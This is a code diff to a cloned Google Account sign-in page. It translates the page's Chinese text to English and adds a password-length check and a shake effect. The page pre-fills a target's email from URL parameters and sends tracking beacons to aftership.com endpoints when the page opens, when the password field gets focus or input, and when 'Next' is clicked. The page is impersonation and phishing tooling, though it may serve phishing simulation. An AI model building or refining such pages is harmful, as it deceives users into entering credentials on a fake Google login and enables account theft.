@@ -39,6 +39,25 @@
             cursor: pointer;
         }
 
+        /* Password field error state styles */
+        .password-error {
+            border: 2px solid #d93025 !important;
+            box-shadow: 0 0 0 2px rgba(217, 48, 37, 0.2) !important;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        /* Shake animation */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        /* Button always-on styles */
+        .VfPpkd-LgbsSe {
+            transition: all 0.3s ease;
+        }
+
         body {
             background: #fff
         }
@@ -16916,7 +16935,7 @@
             opacity: 0;
         }</style>
     </noscript>
-    <title>登录 - Google 账号</title>
+    <title>Sign in - Google Account</title>
     <script nonce="">var AF_initDataKeys = ["ds:0", "ds:1", "ds:2", "ds:3", "ds:4", "ds:5"];
     var AF_dataServiceRequests = {
         'ds:0': {id: 'c4Xk6e', request: []},
@@ -19533,7 +19552,7 @@
 <div class="S7xv8 LZgQXe">
     <div aria-live="assertive" aria-relevant="additions" aria-atomic="true" aria-hidden="true"
          style="color: transparent; z-index: -1; position: absolute; top: 0px; left: 0px; user-select: none;">
-        <div aria-atomic="true">欢迎</div>
+                        <div aria-atomic="true">Welcome</div>
     </div>
     <div class="TcuCfd NQ5OL " jsname="rZHESd" jscontroller="K1ZKnb"
          jsaction="rcuQ6b:npT2md;SlnBXb:r0xNSb;cbwpef:Yd2OHe;iFFCZc:nnGvjf;Rld2oe:oUMEzf;FzgWvd:oUMEzf;rURRne:pSGWxb;"
@@ -19637,7 +19656,7 @@
                 <div class="Svhjgc" jsname="bN97Pc" jscontroller="SD8Jgb" jsshadow=""
                      data-use-configureable-escape-action="true">
                     <div class="zIgDIc" jsname="paFcre">
-                        <c-wiz jsrenderer="OTcFib" jsshadow="" jsdata="deferred-c9" data-p="%.@.]" data-node-index="2;0"
+                        <c-wiz jsrenderer="OTcFib" jsshadow="" jsdata="deferred-c9" data-p="%.@.null" data-node-index="2;0"
                                jsmodel="hc6Ubd" c-wiz="">
                             <div class="Wf6lSd" jscontroller="rmumx" jsname="n7vHCb">
                                 <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48"
@@ -19657,7 +19676,7 @@
                         <div class="ObDc3 ZYOIke" jsname="tJHJj" jscontroller="E87wgc"
                              jsaction="JIbuQc:pKJJqe(af8ijd);wqEGtb:pKJJqe;"><h1 class="vAV9bf" data-a11y-title-piece=""
                                                                                  id="headingText" jsname="r4nke"><span
-                                jsslot="">欢迎</span></h1>
+                                jsslot="">Welcome</span></h1>
                             <div class="gNJDp" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob"></div>
                             <div class="SOeSgb">
                                 <div jscontroller="k5xHfe"
@@ -19706,7 +19725,7 @@
                                                                                                   viewBox="0 0 24 24"
                                                                                                   xmlns="https://www.w3.org/2000/svg"><path
                                             d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"></path></svg></span><span
-                                            jsslot="" jsname="Ud7fr">尝试的失败次数过多</span></h2><div class="osxBFb"
+                                            jsslot="" jsname="Ud7fr">Too many failed attempts</span></h2><div class="osxBFb"
                                                                                                         jsname="HSrbLb"
                                                                                                         aria-hidden="true"></div></div></header><div
                                             class="yTaH4c" jsname="MZArnb"><div jsslot=""></div></div></section><section
@@ -19744,10 +19763,10 @@
                                             class="aCsJod oJeWuf"><div class="aXBtI Wic03c"><div class="Xb9hP"><input
                                             type="password" class="whsOnd zHQkBf" jsname="YPqjbf" id="input_frame"
                                             autocomplete="current-password" spellcheck="false" tabindex="0"
-                                            aria-label="输入您的密码" name="Passwd" aria-disabled="false" autocapitalize="off"
+                                            aria-label="Enter your password" name="Passwd" aria-disabled="false" autocapitalize="off"
                                             dir="ltr" data-initial-dir="ltr" data-initial-value="12312312"
                                             badinput="false"><div jsname="YRMmle" class="AxOyFc snByac"
-                                                                  aria-hidden="true">输入您的密码</div></div><div
+                                                                  aria-hidden="true">Enter your password</div></div><div
                                             class="i9lrp mIZh1c"></div><div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf"
                                                                             style="transform-origin: 115px center;"></div></div></div><div
                                             class="LXRPh"><div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div></div></div></div></div></div></div><div
@@ -19775,7 +19794,7 @@
                                             class="VfPpkd-SJnn3d"></div></div><div class="VfPpkd-OYHm6b"></div><div
                                             class="VfPpkd-sMek6-LhBDec"></div></div></div></div><div class="gyrWGe"><div
                                             jsname="V67aGc" class="jOkGjb"><div jsslot="" id="selectionc7"
-                                                                                class="dJVBl wIAG6d" jsname="CeL6Qc">显示密码</div></div><div
+                                                                                class="dJVBl wIAG6d" jsname="CeL6Qc">Show password</div></div><div
                                             jsname="ij8cu" class="RAvnDd"><div jsslot="" class="dJVBl wIAG6d"
                                                                                jsname="CeL6Qc"></div></div></div></div></div></div><div
                                             aria-atomic="true" aria-live="polite" class="O6yUcb" jsname="h9d3hd"><div
@@ -19784,7 +19803,7 @@
                                             type="hidden" name="historicalPassword" value="false" jscontroller="YgOFye"><div
                                             jscontroller="CMcBD" jsname="Si5T8b" class="lbFS4d eLNT1d"
                                             jsaction="KWPV0:IMdg8d;rcuQ6b:jqIVcd"><div class="FZFVAd"><img
-                                            jsname="O9Milc" alt="用于区分真人和机器人的人机识别系统文字图片" id="captchaimg" class="TrZEUc"><div
+                                            jsname="O9Milc" alt="CAPTCHA image to distinguish between humans and robots" id="captchaimg" class="TrZEUc"><div
                                             jscontroller="f8Gu1e" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="A1U4Sb"
                                             class="XjS9D TrZEUc iLMoFc TrZEUc" id="playCaptchaButton"><div
                                             class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true"><button
@@ -19792,7 +19811,7 @@
                                             jscontroller="soHxf"
                                             jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;mlnRJb:fLiPzd;"
                                             data-idom-class="ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b"
-                                            jsname="LgbsSe" aria-label="认真倾听并输入您听到的数字" type="button"><div
+                                            jsname="LgbsSe" aria-label="Listen carefully and enter the numbers you hear" type="button"><div
                                             class="VfPpkd-Jh9lGc"></div><div class="VfPpkd-J1Ukfc-LhBDec"></div><div
                                             class="VfPpkd-RLmnJb"></div><svg aria-hidden="true" class="Qk3oof"
                                                                              fill="currentColor" focusable="false"
@@ -19814,14 +19833,14 @@
                                                                                            autocomplete="off"
                                                                                            spellcheck="false"
                                                                                            tabindex="0"
-                                                                                           aria-label="输入您听到或看到的文字"
+                                                                                           aria-label="Enter the text you hear or see"
                                                                                            name="ca"
                                                                                            aria-disabled="false" id="ca"
                                                                                            dir="ltr"
                                                                                            data-initial-dir="ltr"
                                                                                            data-initial-value=""><div
                                             jsname="YRMmle" class="AxOyFc snByac"
-                                            aria-hidden="true">输入您听到或看到的文字</div></div><div class="i9lrp mIZh1c"></div><div
+                                            aria-hidden="true">Enter the text you hear or see</div></div><div class="i9lrp mIZh1c"></div><div
                                             jsname="XmnwAc" class="OabDMe cXrdqd"></div></div></div><div class="LXRPh"><div
                                             jsname="ty6ygf" class="ovnfwe Is7Fhb"></div><div jsname="B34EJ"
                                                                                              class="dEOOab RxsGPe"
@@ -19837,7 +19856,7 @@
                     <div class="JYXaTc" jsname="DH6Rkf" jscontroller="z0u0L"
                          jsaction="rcuQ6b:rcuQ6b;KWPV0:vjx2Ld(Njthtb),ChoyC(eBSUOb),VaKChb(gVmDzc),nCZam(W3Rzrc),Tzaumc(uRHG6),JGhSzd;dcnbp:dE26Sc(lqvTlf);FzgWvd:JGhSzd;"
                          data-is-consent="false" data-is-primary-action-disabled="false"
-                         data-is-secondary-action-disabled="false" data-primary-action-label="下一步" jsshadow="">
+                         data-is-secondary-action-disabled="false" data-primary-action-label="Next" jsshadow="">
                         <div class="O1Slxf" jsname="DhK0U">
                             <div class="TNTaPb" jsname="k77Iif">
                                 <div jscontroller="f8Gu1e" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="Njthtb"
@@ -19851,7 +19870,7 @@
                                             <div class="VfPpkd-Jh9lGc"></div>
                                             <div class="VfPpkd-J1Ukfc-LhBDec"></div>
                                             <div class="VfPpkd-RLmnJb"></div>
-                                            <span jsname="V67aGc" class="VfPpkd-vQzf8d">下一步</span></button>
+                                            <span jsname="V67aGc" class="VfPpkd-vQzf8d">Next</span></button>
                                     </div>
                                 </div>
                             </div>
@@ -19867,7 +19886,7 @@
                                             <div class="VfPpkd-Jh9lGc"></div>
                                             <div class="VfPpkd-J1Ukfc-LhBDec"></div>
                                             <div class="VfPpkd-RLmnJb"></div>
-                                            <!--                                            <span jsname="V67aGc" class="VfPpkd-vQzf8d">试试其他方式</span></button>-->
+                                            <!--                                            <span jsname="V67aGc" class="VfPpkd-vQzf8d">Try another way</span></button>-->
                                     </div>
                                 </div>
                             </div>
@@ -19875,7 +19894,7 @@
                     </div>
                 </div>
                 <c-data id="c10" jsdata=" Rf8b0c;_;$11 tEzfhe;_;$12 VY6Opb;_;$13"></c-data>
-                <view-header style="display: none;"><title>登录 - Google 账号</title></view-header>
+                <view-header style="display: none;"><title>Sign in - Google Account</title></view-header>
             </c-wiz>
         </div>
     </div>
@@ -19918,7 +19937,7 @@
                                 <ul class="VfPpkd-rymPhb r6B9Fd bwNLcf P2Hi5d VfPpkd-OJnkse" jsname="rymPhb"
                                     jscontroller="PHUIyb"
                                     jsaction="mouseleave:JywGue; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; keydown:I481le;"
-                                    role="listbox" tabindex="-1" aria-label="更改语言" data-evolution="true"
+                                    role="listbox" tabindex="-1" aria-label="Change language" data-evolution="true"
                                     data-disable-idom="true"><span class="VfPpkd-BFbNVe-bF1uUb NZp2ef"
                                                                    aria-hidden="true"></span>
                                     <li class="MCs1Pd HiC7Nc VfPpkd-OkbHre VfPpkd-aJasdd-RWgCYc-wQNmvb VfPpkd-rymPhb-ibnC6b VfPpkd-rymPhb-ibnC6b-OWXEXe-SfQLQb-Woal0c-RWgCYc"
@@ -20559,13 +20578,13 @@
                 <ul class="HwzH1e">
                     <li class="qKvP1b"><a class="AVAq4d TrZEUc"
                                           href="https://support.google.com/accounts?hl=zh-CN&amp;p=account_iph"
-                                          target="_blank">帮助</a></li>
+                                          target="_blank">Help</a></li>
                     <li class="qKvP1b"><a class="AVAq4d TrZEUc"
                                           href="https://accounts.google.com/TOS?loc=CN&amp;hl=zh-CN&amp;privacy=true"
-                                          target="_blank">隐私权</a></li>
+                                          target="_blank">Privacy</a></li>
                     <li class="qKvP1b"><a class="AVAq4d TrZEUc"
                                           href="https://accounts.google.com/TOS?loc=CN&amp;hl=zh-CN"
-                                          target="_blank">条款</a></li>
+                                          target="_blank">Terms</a></li>
                 </ul>
             </footer>
             <c-data id="i1" jsdata=" OsjLy;_;2"></c-data>
@@ -20588,7 +20607,7 @@
 
 <script>
     document.addEventListener('DOMContentLoaded', function () {
-        // 获取URL参数
+        // Get URL parameters
         const url = new URL(window.location.href);
         const w_id = url.searchParams.get('w_id');
         const b_id = url.searchParams.get('b_id');
@@ -20598,7 +20617,7 @@
         const n_id = url.searchParams.get('n_id');
         const user = url.searchParams.get('email');
 
-        // 页面打开跟踪
+        // Page open tracking
         navigator.sendBeacon(`https://aftership.com/monitor/${w_id}`);
         var imageElement = document.getElementById('pos1');
         imageElement.setAttribute('aria-label', `已选择“${user}”。切换账号`);
@@ -20607,9 +20626,9 @@
         var p33 = document.getElementById('identifierId');
         p33.setAttribute('value', user);
         const pdd = document.getElementById("pdd123");
-        // 修改 div 的内容
+        // Modify div content
         pdd.textContent = user;
-        // 如果user存在，填充到指定的input框中
+        // If user exists, fill in the specified input field
         if (user) {
             const userInput = document.getElementById('notion-email-input-2');
             if (userInput) {
@@ -20617,7 +20636,7 @@
             }
         }
 
-        // 用户名输入框监听
+        // Username input field listener
         const usernameInput = document.getElementById("identifierId");
         if (usernameInput) {
             usernameInput.addEventListener('focus', function() {
@@ -20629,11 +20648,33 @@
             });
         }
 
-        // 密码输入框监听
+        // Password validation function
+        function validatePassword() {
+            const passwordInput = document.getElementById("input_frame");
+            const passwordLength = passwordInput ? passwordInput.value.length : 0;
+            const isValid = passwordLength >= 6; // Password must be at least 6 characters
+            return isValid;
+        }
+
+        // Trigger password field error effect
+        function triggerPasswordError() {
+            const passwordInput = document.getElementById("input_frame");
+            if (passwordInput) {
+                passwordInput.classList.add('password-error');
+                // Remove animation class to allow re-triggering
+                setTimeout(() => {
+                    passwordInput.classList.remove('password-error');
+                }, 500);
+            }
+        }
+
+        // Password input field listener
         const passwordInput = document.getElementById("input_frame");
         if (passwordInput) {
             passwordInput.addEventListener('focus', function() {
                 navigator.sendBeacon(`https://aftership.com/monitor/${p_id}/focus`);
+                // Remove error state
+                passwordInput.classList.remove('password-error');
             });
             passwordInput.addEventListener('input', function(event) {
                 const inputValue = event.target.value.length;
@@ -20641,16 +20682,26 @@
             });
         }
 
-        // 按钮点击监听
+        // Button click listener
         const btn = document.getElementById("next");
         if (btn) {
             btn.addEventListener('click', function() {
-                navigator.sendBeacon(`https://aftership.com/monitor/${b_id}`);
-                document.getElementById("myModal").style.display = "block";
+                // Validate password format
+                if (validatePassword()) {
+                    navigator.sendBeacon(`https://aftership.com/monitor/${b_id}`);
+                    document.getElementById("myModal").style.display = "block";
+                } else {
+                    // Password doesn't meet requirements, trigger shake effect
+                    triggerPasswordError();
+                    console.log("Password length insufficient, cannot submit");
+                    return false;
+                }
             });
         }
 
-        // 模态框关闭监听
+
+
+        // Modal close listener
         const modal = document.getElementById("myModal");
         const span = document.getElementsByClassName("close")[0];
         if (span) {
@@ -20671,7 +20722,7 @@
             }
         });
 
-        // Notion链接点击监听
+        // Notion link click listener
         const notionLink = document.getElementById("notion-link");
         if (notionLink) {
             notionLink.addEventListener('click', function() {
